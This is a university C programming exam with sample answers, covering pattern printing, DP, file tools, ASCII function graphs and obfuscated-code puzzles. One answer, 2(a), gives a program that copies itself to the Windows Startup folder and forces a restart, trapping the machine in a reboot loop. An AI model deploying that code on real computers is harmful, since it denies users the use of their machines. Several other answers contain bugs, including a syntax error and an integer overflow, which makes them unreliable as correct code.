<h2 align="center">Shahjalal University of Science and Technology
</h2>
<h3 align="center">Department of Computer Science and Engineering
</h3>
<div align="center"> 1<sup>st</sup> Year 1<sup>st</sup> Semester Final Examination &mdash;
June 2022 (Session 2021-22) </div>
<div align="center"> Course No. &mdash; <b> CSE 133</b> </div>
<div align="center"> Course Title &mdash; <b> Structured Programming Language</b> </div>
<div align="center"> Time &mdash; <b>  3 Hours</b> &nbsp;&nbsp;&nbsp;&nbsp; Credit: <b> 3.00</b>&nbsp;&nbsp;&nbsp;&nbsp;Total Marks # <b> 100</b></div>
<hr class="divider">
<div align="center"> (Answer All the Questions)</div><br>
<div align="center"><h3><b>Group A</b> </h3></div>
<div align="left"><h4>1. Answer the following Questions in short. (Any <em><ins>Five</ins></em>).
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5 &times; 2 = 10 </h4></div>

**(a)** Guess the output of the following C program
```c++
#include <stdio.h>
int main()
{

    for (long i=0x16,a,j; a="obfuscated_ioweyoualot<uau;au'!;\\v#v[u7\\v#v[u%!:[)w7["
    ")w&!9uZCZu1!*vYvtu#u_u\"ou\"!zcv[w[|^u\"u\\w_v[|^v!'uZu%[#uZ$Zu%u]u[#^u\"u]u#Zu%u]"
    "u[#!\"Zu\"uZu#Yu\"uZ$Z$Zu\"u\\v$['^vZu#Zu#]u$uZ#!#u\\u[u#uZ$Z$Zu#['[&uZv%Zu#Zu#['uZ#!/uZ$Z$Zu$\\"
     "u$[/Zu#Zu$u[u$uZ#!/uZ$Z$Zu&u`%auZu#Zu&u`#!/uZ$Z$Zu*v[%|\\u#Zu*v[#!Xv8!"[i++];){

        for (j=a,a=a>0x74?040:a;j-->0x74;)putchar(j/'0'*'0'-'#'+'!');for(j=a,a=a>0x58?040:a;j-->0x58;)putchar(j/'('*'>');
        for(j=a,a=0x21^(a!=0x21);j-->0x21;)putchar(0x21^0xFC^0xFD);putchar(a==(0xCF^0xEE)?(0xBF^0xB5):(0x280&0x420));
    }

    return 0;
}

```
**Answer:**    
**ideone link: https://ideone.com/ce2EIU**

```
                           ^|||||||||^                          |||||||||^      
                          ||||^^  ^^|||^                      ||||^^  ^^|||^    
                         |||        ^^^                      |||        ^^^     
                        ^||                                  ||^                
         ^^|^^||||||||||||||||||||||||||||^  ^|||||||^ |||||||||||||||||||||||^ 
^^^^^^|||||||||||^^|||^^^|||^^^^^^^^||||||^ ^||||^^^|||||||^^|||^^^^^^^^||||||^^
      ^||^    |||  ^||   ||^    ^|||||^|||  ||||||^ ^|||||^  ||^    ^|||||^|||  
 ||^ ^||^  |^ ^||   ||   ||^ ^||||^^   |||      ||||||^^||^  ||^  |||||^   ^||  
  ^||||^|||^  ^||   ||   ||^  |||      |||     ^||^^    ||^  ||^  |||      ^||  
              ^||   ||   ||^   ||||^   |||              ||^  ||^   ^|||^   ^||  
              ^||   ||   ||^     ^||||||||    |||||||||^||^  ||^     ^||||||||  
              ^||   ||   ||^         ^^|||    ^^^^^^^^||||^  ||^         ^^|||  
                                                       ^^                       

```
<br/>

**(b)** A monkey is climbing up a bamboo. The height of the bamboo is N unit. Each time it can jump 1 or 2 unit at once. Using C programming language, write a program to calculate the number of distinct ways it can reach the top. **(N<=10<sup>6</sup>)**

Example: if N=3 , the monkey can reach the top in 3 distinct ways. 1+1+1, 1+2 and 2+1

**Answer:**
```c++
#include <stdio.h>
int main()
{
    int N; scanf("%d",&N);
    int dp[1000001]={0};
    dp[1]=1;
    dp[2]=2;
    for (int i=3; i<=N; i++)dp[i]=dp[i-1]+dp[i-2];
    printf("%d\n",dp[N]);
}
```


**(c)** Write a C program that prints the following pattern for `rows` lines. Take `rows` as input.
```
*
* *
* * *
* * * *
* * * * *
```

**Answer:**
```c++
#include <stdio.h>
int main() {
   int i, j, rows;
   scanf("%d", &rows);
   for (i = 1; i <= rows; i++) {
      for (j = 1; j <= i; j++) {
         printf("* ");
      }
      printf("\n");
   }
   return 0;
}
```


**(d)** Write a C program that prints the following pattern for `rows` lines. Take `rows` as input.
```
* * * * *
* * * *
* * * 
* *
*
```

**Answer:**
```c++
#include <stdio.h>
int main() {
   int i, j, rows;
   scanf("%d", &rows);
   for (i = rows; i >= 1; i--) {
      for (j = 1; j <= i; j++) {
         printf("* ");
      }
      printf("\n");
   }
   return 0;
}
```

**(e)** Write a C program that prints the following pattern for `rows` lines. Take `rows` as input.
```
        *
      * * *
    * * * * *
  * * * * * * *
* * * * * * * * *
```

**Answer:**
```c++
#include <stdio.h>
int main() {
   int i, space, rows;
   scanf("%d", &rows);
   for (i = 1; i <= rows; i++) {
      for (space = 1; space <= rows - i; space++) {
         printf("  ");
      }
      int j;
      for (j=0; j < 2 * i - 1; j++) {
         printf("* ");
      }
      printf("\n");
   }
   return 0;
}
```

**(f)** Write a C program that prints the following pattern for `rows` lines. Take `rows` as input.
```
* * * * * * * * *
  * * * * * * *
    * * * * *
      * * *
        *
```

**Answer:**
```c++
#include <stdio.h>
int main() {
   int rows, i, j, space;
   scanf("%d", &rows);
   for (i = rows; i >= 1; i--) {
      for (space = 0; space < rows - i; space++)
         printf("  ");
      for (j = i; j <= 2 * i - 1; j++)
         printf("* ");
      for (j = 0; j < i - 1; j++)
         printf("* ");
      printf("\n");
   }
   return 0;
}
```


**(g)** What does the following C program print?
```c++
#include<stdio.h>
int f=1<<1^1; main(int ioweualot){
    f&1?ioweualot=0x31323032,f^=1,main(037756526274):(f>>1?ioweualot=~ioweualot,f^=f,
    main(1414141414):(ioweualot+=151515<<1<<1,ioweualot^=1)); printf((char*)&ioweualot); putc(0,stdout);

}
```
**Answer:** <br/>
**ideone link: https://ideone.com/NSGnuf**

The output of the program is:

```
SUSTCSE2021
```

**(h)** Write a C program which displays current date and time when it is executed.<br/>Here is a sample output-
```
Fri Jul 07 19:53:34 2023
```

**Answer:**

```c++
#include<stdio.h>
#include<time.h>

int main()
{
	time_t x; time(&x);
	printf(ctime(&x));
	
	return 0;
}
```


<br/><br/>
<h4><div align="left">2. Answer the following Questions. (Any <em><ins>Four</ins></em>). &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4 &times; 5 = 20 </div></h4>




**(a)** Write a C program which will copy itself to Windows startup folder **(once executed in administrator mode)** and make the computer go restart everytime immediately after it turns on.

**Answer:**

```c++
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
int main(int argc, char** argv)
{


    char command[500];
    sprintf(command, "copy \"%s\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\"", argv[0]);
    system(command);
    system("c:\\windows\\system32\\shutdown /r");

    return 0;
}
```
          
**(b)** Once upon a time, there was a popular program named **TERAcopy**. None uses it in 2023. <br/>
    Write the required code to develop a console program in C language and name the program **SUSTcopy**. The purpose of this program will be copying files. A user will run the following command from **CMD/console** to get the file `secret.zip` copied from it's original location, which is `C:\User\Secret folder\` to a new location, which is `D:\gupon folder\`. <br/>

```bash
SUSTcopy.exe "C:\User\Secret folder\Secret.zip" "D:\gupon folder\new_name.zip"
```
Also show the speed in MB/s.

**Answer:**

```c++
#include <stdio.h>
#include <time.h>
int main(int argc, char** argv)
{
    time_t start; time(&start);
    if (argc!=3)
    {
        puts("SUSTcopy Error :) Please provide parameters correctly\n");
        return 0;
    }

    char buffer[1024];
    int size;

    FILE* source = fopen(argv[1], "rb");
    FILE* dest = fopen(argv[2], "wb");


    if (source==NULL)
    {
        puts("SUSTcopy Error :) Can't open source file\n");
        return 0;
    }

    if (dest==NULL)
    {
        puts("SUSTcopy Error :) Can't open destination file. Restricted:( \n");
        return 0;
    }

    double total=0;

    while (1)
    {
        size = fread(buffer, 1, 1024, source);
        total+=size;
        if (!size) break;
        fwrite(buffer, 1, size, dest);
    }

    fclose(source);
    fclose(dest);
    
    time_t finish; time(&finish);
    puts("\nSuccessful :)\n");
    time_t diff=finish-start;

    total/=1024*1024;
    printf("Speed = %g MBps\n", total/diff);

    return 0;
}

```

**(c)** Jidne Huda's most precious Lenovo Thinkpad is running out of space these days and he is trying to identify some unnecessary file which are taking up space. As he always wants to be precise in his calculation and owes his laptop a lot, he needs to know exaclty how much byte is being occupied by a file. But when he clicks checks the *Properties* of a file, *Windows* shows him two different values (one is *Size*, another one is *Size on Disk*). He is totally confused and asking you to help him.<br/>
Write a C program that takes the name & location of a file as parameter, and displays the size of that file in *bytes*. Name the program `OWEsize.exe`<br/>Jidne will run the following command from **CMD/console** to get the size of the file `iowenobody.zip`which is located in `C:\`
```bash
OWEsize.exe C:\iowenobody.zip
```

**Answer:**
```c++
#include <stdio.h>
#include <time.h>
int main(int argc, char** argv)
{
    if (argc!=2)
    {
        puts("Please provide parameter correctly\n");
        return 0;
    }

    char buffer[1024];
    int size;

    FILE* source = fopen(argv[1], "rb");



    if (source==NULL)
    {
        puts("Error :) Can't open source file\n");
        return 0;
    }

    unsigned long long total=0;

    while (1)
    {
        size = fread(buffer, 1, 1024, source);
        total+=size;
        if (!size) break;
    }

    fclose(source);
    printf("size = %llu\n, total);
    return 0;
}

```


(d) Write a C program to print Fibonacci series upto a certain number N(The last number should be less than or equal to N).<br/>Here is a sample output for N=100-
```
0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89
```

**Answer:**
```c++
#include <stdio.h>
int main() {
  int t1 = 0, t2 = 1, nextTerm = 0, n;
  scanf("%d", &n);

  printf("%d, %d, ", t1, t2);
  nextTerm = t1 + t2;

  while (nextTerm <= n) {
    printf("%d, ", nextTerm);
    t1 = t2;
    t2 = nextTerm;
    nextTerm = t1 + t2;
  }

  return 0;
}
```

<br/><br/>


<h4><div align="left">3. Answer the following Questions. (Any <em><ins>Two</ins></em>). &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2 &times; 10 = 20 </div> </h4>


**(a)** You are given the marks of 100005 students of your class. Their roll numbers go from 1 to 100005 consecutively. You have to choose a range of roll numbers with maximum amount of students, such that each of the students belonging to that range have got more than or equal to 80 marks.

Write a C program that takes the marks of 100005 students as input and outputs 2 integers (starting roll number of the range and finishing roll number of the range). If there are more than one ranges with same amount of students, output the range that comes first. If there are no students with mark more than or equal to 80, output -1.

**Answer:**
``` c++
#include <stdio.h>
int main()
{
    int n=100005;
    int marks[100005];
    for (int i=0; i<n; i++) scanf("%d",&marks[i]);
    int cnt[100005]={0};
    cnt[0]=(marks[0]>=80);
    int r=-1; int l=0;
    for (int i=0; i<n; i++) {
        if (i && marks[i]>=80) cnt[i]+=1+cnt[i-1];
        if (cnt[i]>r-l+1) {r=i+1; l=i-cnt[i]+2;}
    }
    if (r==-1) printf("-1\n");
    else printf("%d %d\n", l, r);
}
```

**(b)** The famous game show "Kaun Banega Karorpati" is going on and you have been invited. Now you are given a bundle of US Dollar Notes and you can pick only one portion of consecutive notes from the bundle. As you don't want to miss the chance of being 'Karorpati', you need to precalculate which portion is to be choosen so that it has maximum value. (i.e. the sum of the values of each notes in that portion is maximum among all possible portions) **(N.B. some notes have negative value)**

Write a C program that takes input, N(total number of notes in the bundle) , then takes N integers(Dollar value of each note) and outputs three integers (l, r, val - starting and finishing index of the portion of bundle to be choosen and maximum value you can achieve). If there are multiple portions with same value output any. If all notes have negative value, output -1. 

**Answer:**

``` c++
#include <stdio.h>
int main()
{
    int n; scanf("%d",&n);
    int notes[100000];
    for (int i=0; i<n; i++) scanf("%d",&notes[i]);
    int cnt[100000]={0}; int beg[100000]={0};
    int r=-1; int l=0;
    int val=-1;
    cnt[0]=(notes[0]>0?notes[0]:0);
    for (int i=0; i<n; i++) {
        if (i && notes[i]>=0) {cnt[i]+=notes[i]+cnt[i-1]; beg[i]=beg[i-1];}
        if (notes[i]<0) beg[i]=i+1;
        if (cnt[i]>val) {val=cnt[i]; r=i+1; l=beg[i]+1;}
    }
    if (r==-1) printf("-1\n");
    else printf("%d %d %d\n", l, r, val);
}
```

**(c)** Write a C program to display Pascal's triangle upto N-th row. Take N as input.<br/>
Here is a sample output for N=5.
```
           1
         1   1
       1   2   1
     1   3   3    1
   1  4    6   4   1
 1  5   10   10  5   1
```

**Answer:**
``` c++
#include <stdio.h>

int fact(int n)
{
  int a=1;
  for (int i=1; i<=n; i++) a*=i;
  return a;
}

int ncr(int n, int r)
{
  return fact(n) / (fact(r) * fact(n-r));
}

int main()
{
  int rows;
  scanf("%d", &rows);

  for (int i = 0; i <= rows; i++)
  {
    for (int j = 0; j <= rows - i; j++) printf("  ");
    for (int j = 0; j <= i; j++) printf(" %3d", ncr(i, j));
    puts("");
  }

  return 0;
}

```       
<br/><br/>
<h3><div align="center"><b>Group B</b> </div> </h3>
<h4><div align="left">1. Answer the following Questions in short. (Any <em><ins>Five</ins></em>). &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5 &times; 2 = 10 </div></h4>

**(a)** Write a C program that prints the graph of **y=sin(x)** in all four quadrants. You may pick any value of period for the function instead of `2π` by multiplying a constant with `x` to squeeze or expand the graph horizontally.<br/>Here is a sample of the graph for better visualization-

```
                        .......                                 |        .......                                           ......
                      ..       ..                               |       .       ..                                       ..
                     .           .                              |      .          .                                     .
                    /             \                             |     /            \                                   /
                   /               \                            |    /              \                                 /
                  /                 \                           |   /                \                               /
                                                                |  /                  \                             /
                 /                   \                          | /                    \                           /
                /                     \                         |/
               /                       \                        |                       \                         /
______________/_________________________\_______________________|________________________\_______________________/_______________
                                                               /|                         \                     /
             /                           \                    / |                          \                   /
            /                             \                  /  |
           /                               \                /   |                           \                 /
          /                                 \              /    |                            \               /
         /                                   \            /     |                             \             /
        .                                     .          .      |                              .           .
      ..                                       ..       .       |                               ..       ..
......                                           .......        |                                 .......
                                                                |
```
**Sample Answer:**
```c++
#include <stdio.h>
#include <math.h>

int mval; double INF=1e9;

double func(int x)
{
	return sin(0.4 * x / acos(-1));
	
}

double der_func(int x)
{
	return cos(0.4 * x / acos(-1));
	
}

int main()
{
	mval = 1;
	int xf = 10;
	int xf2 = 21;
	char graph[xf2][66];
	
	for (int i = 0; i < xf2; i++)
	{
		if (i == xf)
			for (int j = 0; j < 65; j++)
				graph[i][j] = '_';

		else
			for (int j = 0; j < 65; j++)
				graph[i][j] = ' ';

		graph[i][65] = '\0';

		graph[i][32] = '|';
	}
	

	for (int i = 0; i < 65; i++)
	{
		if (i == 32) continue;
		
		char c;
		
		double slope = der_func(i - 32);
		
		if (fabs(slope)>=INF) c = '|';
		else if (fabs(slope) >= 0.70)
		{
			if (slope > 0) c = '/';
			else c = '\\';
		}
		else c = '.';

		graph[(int)(-func(i - 32) / mval * (double)xf + xf)][i] = c;
		
	}

	for (int i = 0; i < xf2; i++) puts(graph[i]);

	return 0;
}
```


**(b)** Write a C program that prints the graph of **y=cos(x)** in all four quadrants. You may pick any value of period for the function instead of `2π` by multiplying a constant with `x` to squeeze or expand the graph horizontally.<br/>Here is a sample of the graph for better visualization-
```
            .......                                          ...|...                                          .......
          ..       .                                       ..   |   ..                                       .       ..
         .          .                                     .     |     .                                     .          .
        /            \                                   /      |      \                                   /            \
       /              \                                 /       |       \                                 /              \
      /                \                               /        |        \                               /                \
     /                  \                                       |                                       /                  \
    /                    \                            /         |         \                            /                    \
                          \                          /          |          \                          /
   /                                                /           |           \                                                \
__/________________________\_______________________/____________|____________\_______________________/________________________\__
 /                          \                                   |                                   /                          \
/                            \                    /             |             \                    /                            \
                              \                  /              |              \                  /
                               \                /               |               \                /
                                \              /                |                \              /
                                 \            /                 |                 \            /
                                  .          .                  |                  .          .
                                   .       ..                   |                   ..       .
                                    .......                     |                     .......
                                                                |
```

**Sample Answer:**
```c++
#include <stdio.h>
#include <math.h>

int mval; double INF=1e9;

double func(int x)
{
	return cos(0.4 * x / acos(-1));

}

double der_func(int x)
{
	return -sin(0.4 * x / acos(-1));

}

int main()
{
	mval = 1;
	int xf = 10;
	int xf2 = 21;
	char graph[xf2][66];

	for (int i = 0; i < xf2; i++)
	{
		if (i == xf)
			for (int j = 0; j < 65; j++)
				graph[i][j] = '_';

		else
			for (int j = 0; j < 65; j++)
				graph[i][j] = ' ';

		graph[i][65] = '\0';

		graph[i][32] = '|';
	}


	for (int i = 0; i < 65; i++)
	{
		if (i == 32) continue;

		char c;

		double slope = der_func(i - 32);

		if (fabs(slope)>=INF) c = '|';
		else if (fabs(slope) >= 0.70)
		{
			if (slope > 0) c = '/';
			else c = '\\';
		}
		else c = '.';

		graph[(int)(-func(i - 32) / mval * (double)xf + xf)][i] = c;

	}

	for (int i = 0; i < xf2; i++) puts(graph[i]);

	return 0;
}
```


**(c)** Write a C program that prints the graph of **y=tan(x)** in all four quadrants. You may pick any value of period for the function instead of `π` by multiplying a constant with `x` to squeeze or expand the graph horizontally.<br/>Here is a sample of the graph for better visualization-
```
         /                     /                     /          |         /                     /                     /
                                                                |
                                                                |                              /                     /
       /                     /                     /            |        /
                                                                |
      /                     /                     /             |       /                     /                     /
                           /                     /              |      /                     /                     /
     /                    /                     /               |     /                     /                     /
  ..                    ..                    ..                |   ..                    ..                    ..
..                   ...                   ...                  |...                  ....                  ....
_________________....__________________....__________________...|__________________...___________________...___________________..
               ..                    ..                    ..   |                ..                    ..                    ..
              /                     /                     /     |               /                     /                     /
             /                     /                     /      |              /                     /
            /                     /                     /       |             /                     /                     /
                                                                |
                                                       /        |            /                     /                     /
           /                     /                              |
                                                                |
                                                                |
                                                                |
```

**Sample Answer:**
```c++
#include <stdio.h>
#include <math.h>

int mval; double INF=1e9;

double func(int x)
{
	double ans= tan(0.45* x / acos(-1));
	if (ans>(double)mval) return (double)mval;
	return ans;

}

double der_func(int x)
{
	double ans=cos(0.45*x / acos(-1));
	if (ans==0) return INF;
	return 1.0/ans/ans;

}

int main()
{
	mval = 5;
	int xf = 10;
	int xf2 = 21;
	char graph[xf2][66];

	for (int i = 0; i < xf2; i++)
	{
		if (i == xf)
			for (int j = 0; j < 65; j++)
				graph[i][j] = '_';

		else
			for (int j = 0; j < 65; j++)
				graph[i][j] = ' ';

		graph[i][65] = '\0';

		graph[i][32] = '|';
	}


	for (int i = 0; i < 65; i++)
	{
		if (i == 32) continue;

		char c;

		double slope = der_func(i - 32);
		if (fabs(slope)>=INF) c = '|';
		else if (fabs(slope) >= 2)
		{
			if (slope > 0) c = '/';
			else c = '\\';
		}
		else c = '.';
        	int y=(int)(-func(i - 32) / (double )mval * (double)xf + xf); if (y>=xf2 || y<0) continue;
		graph[y][i] = c;
		if (c=='/' && i && graph[y][i-1]=='/') graph[y][i-1]=' ';

	}

	for (int i = 0; i < xf2; i++) puts(graph[i]);

	return 0;
}
```


**(d)** Write a C program that prints the graph of a straight line(**y=ax+b**) in all four quadrants. You may pick any value of `a` and `b` except `0`.<br/>Here is a sample of the graph for better visualization-
```
                                |             /
                                |           /
                                |         /
                                |       /
                                |     /
                                |   /
                                | /
                                |
                              / |
                            /   |
_________________________ /_____|________________________________
                        /       |
                      /         |
                    /           |
                  /             |
                /               |
              /                 |
            /                   |
          /                     |
        /                       |
      /                         |
```

**Sample Answer:**
```c++
#include <stdio.h>
#include <math.h>

double func(int x)
{
    return 0.5*x+3;
}

int main()
{
	int xf = 10;
	int xf2 = 21;
	char graph[xf2][66];

	for (int i = 0; i < xf2; i++)
	{
		if (i == xf)
			for (int j = 0; j < 65; j++)
				graph[i][j] = '_';

		else
			for (int j = 0; j < 65; j++)
				graph[i][j] = ' ';

		graph[i][65] = '\0';

		graph[i][32] = '|';
	}


	for (int i = 0; i < 65; i++)
	{
		if (i == 32) continue;

        	int y=(int)(-func(i - 32)+ xf); if (y>=xf2 || y<0) continue;
		graph[y][i] = '/';
		if (i && graph[y][i-1]=='/') graph[y][i-1]=' ';

	}

	for (int i = 0; i < xf2; i++) puts(graph[i]);

	return 0;
}
```


**(e)** Write a C program that prints the graph of a parabola (**y=ax<sup>2</sup>**) in all four quadrants. You may pick any value of `a` except `0`.<br/>Here is a sample of the graph for better visualization-
```
      \                         |                         /
       \                        |                        /
        \                       |                       /
         \                      |                      /
          \                     |                     /
            \                   |                   /
              .                 |                 .
                .               |               .
                  .             |             .
                     .          |          .
________________________........|........________________________
                                |
                                |
                                |
                                |
                                |
                                |
                                |
                                |
                                |
                                |
```

**Sample Answer:**
```c++
#include <stdio.h>
#include <math.h>


double func(int x)
{
	return 0.015*x*x;

}

double der_func(int x)
{
	return 0.03*x;

}

int main()
{
	int xf = 10;
	int xf2 = 21;
	char graph[xf2][66];

	for (int i = 0; i < xf2; i++)
	{
		if (i == xf)
			for (int j = 0; j < 65; j++)
				graph[i][j] = '_';

		else
			for (int j = 0; j < 65; j++)
				graph[i][j] = ' ';

		graph[i][65] = '\0';

		graph[i][32] = '|';
	}


	for (int i = 0; i < 65; i++)
	{
		if (i == 32) continue;

		char c;

		double slope = der_func(i - 32);
		if (fabs(slope)>=1e9) c = '|';
		else if (fabs(slope) >= 0.6)
		{
			if (slope > 0) c = '/';
			else c = '\\';
		}
		else c = '.';

        	int y=(int)(-func(i - 32) + xf+1); if (y>=xf2 || y<0) continue;
		graph[y][i] = c;
		if (y!=xf && i && graph[y][i-1]!=' ') if (i>32) graph[y][i-1]=' '; else graph[y][i]=' ';

	}

	for (int i = 0; i < xf2; i++) puts(graph[i]);

	return 0;
}
```


**(f)** Write a C program that prints the graph of exponential function (${y=e^x}$) in all four quadrants. You may multiply any constant with `x` to squeeze or expand the graph horizontally.<br/>Here is a sample of the graph for better visualization-
```
                                |                       /
                                |                      /
                                |                     /
                                |                    /
                                |                   /
                                |                 /
                                |               /
                                |            /
                                |         .
                                      .
................................|________________________________
                                |
                                |
                                |
                                |
                                |
                                |
                                |
                                |
                                |
                                |
```

**Sample Answer:**
```c++
#include <stdio.h>
#include <math.h>


double func(int x)
{
    return pow(exp(1), x/10.0);

}

double der_func(int x)
{
	return func(x)/10.0;
}



int main()
{
	int xf = 10;
	int xf2 = 21;
	char graph[xf2][66];

	for (int i = 0; i < xf2; i++)
	{
		if (i == xf)
			for (int j = 0; j < 65; j++)
				graph[i][j] = '_';

		else
			for (int j = 0; j < 65; j++)
				graph[i][j] = ' ';

		graph[i][65] = '\0';

		graph[i][32] = '|';
	}


	for (int i = 0; i < 65; i++)
	{
		if (i == 32) continue;

		char c;

		double slope = der_func(i - 32);
		if (fabs(slope)>=1e9) c = '|';
		else if (fabs(slope) >= 0.3)
		{
			if (slope > 0) c = '/';
			else c = '\\';
		}
		else c = '.';

        	int y=(int)(-func(i - 32) + xf+1); if (y>=xf2 || y<0) continue;
		graph[y][i] = c;
		if (y!=xf && i && graph[y][i-1]!=' ') if (i>32) graph[y][i-1]=' '; else graph[y][i]=' ';

	}

	for (int i = 0; i < xf2; i++) puts(graph[i]);

	return 0;
}

```


**(g)** Write a C program that prints the graph of (${y=x^3}$) in all four quadrants. You may multiply any constant with `x` to squeeze or expand the graph horizontally.<br/>Here is a sample of the graph for better visualization-
```
                                |                           /
                                |                         /
                                |                        /
                                |                       /
                                |                      /
                                |                     /
                                |                   /
                                |                  /
                                |                /
                                |             .
_____________________...........|..........______________________
                  .             |
               /                |
             /                  |
            /                   |
          /                     |
         /                      |
        /                       |
       /                        |
      /                         |
     /                          |
```

**Sample Answer:**
```c++
#include <stdio.h>
#include <math.h>


double func(int x)
{
    return 0.0005*x*x*x;

}

double der_func(int x)
{
	return 0.0015*x*x;
}



int main()
{
	int xf = 10;
	int xf2 = 21;
	char graph[xf2][66];

	for (int i = 0; i < xf2; i++)
	{
		if (i == xf)
			for (int j = 0; j < 65; j++)
				graph[i][j] = '_';

		else
			for (int j = 0; j < 65; j++)
				graph[i][j] = ' ';

		graph[i][65] = '\0';

		graph[i][32] = '|';
	}


	for (int i = 0; i < 65; i++)
	{
		if (i == 32) continue;

		char c;

		double slope = der_func(i - 32);
		if (fabs(slope)>=1e9) c = '|';
		else if (fabs(slope) >= 0.3)
		{
			if (slope > 0) c = '/';
			else c = '\\';
		}
		else c = '.';

		int y=(int)(-func(i - 32) + xf+0.5); if (y>=xf2 || y<0) continue;
		graph[y][i] = c;
		if (y!=xf && i && graph[y][i-1]!=' ') if (i>32) graph[y][i-1]=' '; else graph[y][i]=' ';

	}

	for (int i = 0; i < xf2; i++) puts(graph[i]);

	return 0;
}
```


**(h)** Write a C program that prints the graph of (${y = {1 \over x}}$) in all four quadrants.  You may multiply any constant with `x` to squeeze or expand the graph.<br/>Here is a sample of the graph for better visualization-
```
                                |         \
                                |          \
                                |            \
                                |              \
                                |                 \
                                |                     .
                                |                           .
                                |                               .
                                |
                                |
________________________________|________________________________
                                |
                                |
.  .                            |
        .                       |
            .                   |
               \                |
                 \              |
                   \            |
                     \          |
                      \         |
```

**Sample Answer:**
```c++
#include <stdio.h>
#include <math.h>


double func(int x)
{
    return 100.0/x;
}

double der_func(int x)
{
	return -func(x)/x;
}



int main()
{
	int xf = 10;
	int xf2 = 21;
	char graph[xf2][66];

	for (int i = 0; i < xf2; i++)
	{
		if (i == xf)
			for (int j = 0; j < 65; j++)
				graph[i][j] = '_';

		else
			for (int j = 0; j < 65; j++)
				graph[i][j] = ' ';

		graph[i][65] = '\0';

		graph[i][32] = '|';
	}


	for (int i = 0; i < 65; i++)
	{
		if (i == 32) continue;

		char c;

		double slope = der_func(i - 32);
		if (fabs(slope)>=1e9) c = '|';
		else if (fabs(slope) >= 0.3)
		{
			if (slope > 0) c = '/';
			else c = '\\';
		}
		else c = '.';

        	int y=(int)(-func(i - 32) + xf+0.5); if (y>=xf2 || y<0) continue;
		graph[y][i] = c;
		if (y!=xf && i && graph[y][i-1]!=' ') if (i>32) graph[y][i-1]=' '; else graph[y][i]=' ';
        	if (y!=xf && i>1 && graph[y][i-2]!=' ') if (i>32) graph[y][i-2]=' '; else graph[y][i]=' ';

	}

	for (int i = 0; i < xf2; i++) puts(graph[i]);

	return 0;
}
```

<br/><br/>
